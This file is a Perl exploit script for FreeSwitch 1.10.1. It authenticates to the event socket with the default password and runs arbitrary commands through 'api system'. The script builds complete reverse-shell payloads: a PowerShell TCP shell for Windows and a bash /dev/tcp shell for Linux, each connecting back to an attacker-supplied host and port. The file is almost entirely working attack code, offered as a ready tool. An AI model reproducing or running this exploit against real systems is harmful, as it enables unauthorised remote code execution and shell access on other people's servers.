#!/usr/bin/env perl


use strict;
use warnings;
use IO::Socket::INET;
use Getopt::Long qw[:config no_ignore_case];

sub help {
    print <<HELP;
$0 - Exploit for FreeSwitch 1.10.1 Authenticated Remote Code Execution (RCE)

Usage: $0 [options]

Options:
    -h, --help                  Show this help message and exit
    -t, --target      <ip>      Target hostname/ip
    -p, --port       <port>     Target port (default: 8021)
    -P, --pass     <password>   Password for FreeSwitch (default: ClueCon)
    -c, --command  <command>    Command to be run (if not a reverse shell)
    -s, --system   [win,lin]    Specify which system is running on the target (default: win)
    -l, --lhost     <lhost>     Host that is going to receive the reverse shell
    -o, --lport     <lport>     Port used by the reverse shell


Exploit coded by LvMalware (https://github.com/lvmalware)

HELP
    exit 0
}

sub main {
    my ($target, $lhost, $lport, $command);
    my ($port, $pass, $shell) = (8021, "ClueCon", "win");
    GetOptions(
        'h|help'        => \&help,
        't|target=s'    => \$target,
        'p|port=i'      => \$port,
        'P|pass=s'      => \$pass,
        'c|command=s'   => \$command,
        's|system=s'    => \$shell,
        'l|lhost=s'     => \$lhost,
        'o|lport=i'     => \$lport,
    ) || die "Error: $!";

    help() unless $target;

    unless ($command || ($lhost && $lport)) {
        print "You must specify either 'command' or 'lhost' and 'lport'\n";
        return 1;
    }

    if ($lhost && $lport) {
        if ($shell =~ /win/i) {
            print "[*] Assuming target operating system is Windows...\n";
            $command = qq/powershell -nop -c "\$client = New-Object System.Net.Sockets.TCPClient('$lhost',$lport);\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2 = \$sendback + 'PS ' + (pwd).Path + '> ';\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()"/;
        } else {
            print "[*] Assuming target operating system is GNU/Linux...\n";
            $command = "bash -c 'exec bash -i >& /dev/tcp/$lhost/$lport 0<&1'";
        }
    }

    print "[*] Connecting to target...\n";
    my $sk = IO::Socket::INET->new(
        PeerHost    => $target,
        PeerPort    => $port,
        Proto       => 'tcp',
    ) || die "Can't connect to $target:$port";
    
    print "[*] Trying to authenticate...\n";

    chomp(my $data = <$sk>);

    if ($data =~ /auth\/request/) {
        print $sk "auth $pass\n\n";
    }

    chomp($data = <$sk>) for 1 .. 3;

    if ($data !~ /OK/) {
        print "[!] Something went wrong\n";
        return 1;
    }

    print "[*] Running command...\n";

    print $sk "api system $command\n\n";

    print "[*] Done. It should execute anytime now\n";

    0;
}

exit main unless caller;
